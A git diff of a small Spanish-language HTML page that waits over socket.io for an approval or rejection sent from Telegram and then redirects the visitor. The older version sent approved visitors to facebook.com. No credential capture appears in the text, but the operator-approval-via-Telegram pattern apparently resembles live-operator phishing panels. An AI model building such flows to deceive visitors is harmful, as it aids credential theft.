@@ -1,48 +1,33 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Esperando confirmación...</title>
-  <script src="/socket.io/socket.io.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f3f3f3;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .mensaje {
-      background: white;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Esperando Aprobación</title>
 </head>
 <body>
-  <div class="mensaje">
-    <h2>Esperando autorización desde Telegram...</h2>
-    <p>No cierres esta ventana.</p>
-  </div>
+  <h2>🔐 Esperando decisión del administrador...</h2>
 
+  <script src="/socket.io/socket.io.js"></script>
   <script>
     const socket = io();
-    const urlParams = new URLSearchParams(window.location.search);
-    const sessionId = urlParams.get('sessionId');
+    const sessionId = localStorage.getItem('sessionId');
 
-    // Reconectar al servidor
-    socket.emit('reconectar', sessionId);
+    // Enviar sessionId al servidor para reconectar
+    if (sessionId) {
+      socket.emit("reconectar", sessionId);
+    } else {
+      alert("No se encontró el sessionId. Vuelve a iniciar el proceso.");
+    }
 
-    // Escuchar respuesta del bot
-    socket.on('respuesta', (decision) => {
-      if (decision === 'aprobado') {
-        window.location.href = 'https://www.facebook.com'; // o donde necesites
+    // Escuchar la respuesta desde Telegram
+    socket.on("respuesta", (decision) => {
+      if (decision === "aprobado") {
+        window.location.href = "/bienvenido.html";
+      } else if (decision === "rechazado") {
+        window.location.href = "/denegado.html";
       } else {
-        alert('Acceso denegado por seguridad.');
-        window.location.href = '/';
+        alert("Respuesta desconocida del servidor.");
       }
     });
   </script>
